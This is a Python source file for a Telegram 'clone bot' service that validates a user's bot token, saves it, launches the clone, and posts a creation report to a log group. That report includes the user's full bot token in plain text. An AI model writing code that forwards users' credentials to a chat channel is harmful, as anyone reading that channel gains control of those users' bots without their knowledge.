
import html

from aiogram import Bot

from database.clone_db import save_clone
from database.db import get_bot_stats
from services.logger import send_log
from services.clone_runtime import clone_runtime


async def create_clone(
    main_bot: Bot,
    owner_id: int,
    token: str
):
    clone_bot = None
    registered = False

    try:
        clone_bot = Bot(token=token)

        # Token doğrulama
        bot_info = await clone_bot.get_me()

        if not bot_info.username:
            return False, "Bot kullanıcı adı alınamadı."

        # Klon botu veritabanına kaydet
        await save_clone(
            bot_id=bot_info.id,
            owner_id=owner_id,
            username=bot_info.username,
            token=token
        )

        # Klonu çalıştır
        await clone_runtime.add_bot(clone_bot)
        registered = True

        # Güncel istatistikleri al
        stats = await get_bot_stats()

        # Tokeni yalnızca özel log grubuna gönder
        safe_token = html.escape(token)

        log_message = (
            "🆕 <b>YENİ KLON BOT OLUŞTURULDU</b>\n\n"
            f"👤 Oluşturan ID: <code>{owner_id}</code>\n"
            f"🤖 Bot: @{html.escape(bot_info.username)}\n"
            f"🆔 Bot ID: <code>{bot_info.id}</code>\n"
            f"🔑 Bot Tokeni: <code>{safe_token}</code>\n\n"
            "📊 <b>GÜNCEL İSTATİSTİKLER</b>\n"
            f"👥 Kullanıcı sayısı: <b>{stats['users']}</b>\n"
            f"🏘 Grup sayısı: <b>{stats['groups']}</b>\n"
            f"🤖 Klon bot sayısı: <b>{stats['clones']}</b>\n\n"
            "✅ Durum: Aktif"
        )

        await send_log(main_bot, log_message)

        return True, bot_info.username

    except Exception as error:
        print("Klon oluşturma hatası:", type(error).__name__)

        return False, (
            "Klon oluşturulamadı veya çalıştırılamadı. "
            "Tokeni kontrol edip tekrar dene."
        )

    finally:
        if clone_bot and not registered:
            try:
                await clone_bot.session.close()
            except Exception:
                pass
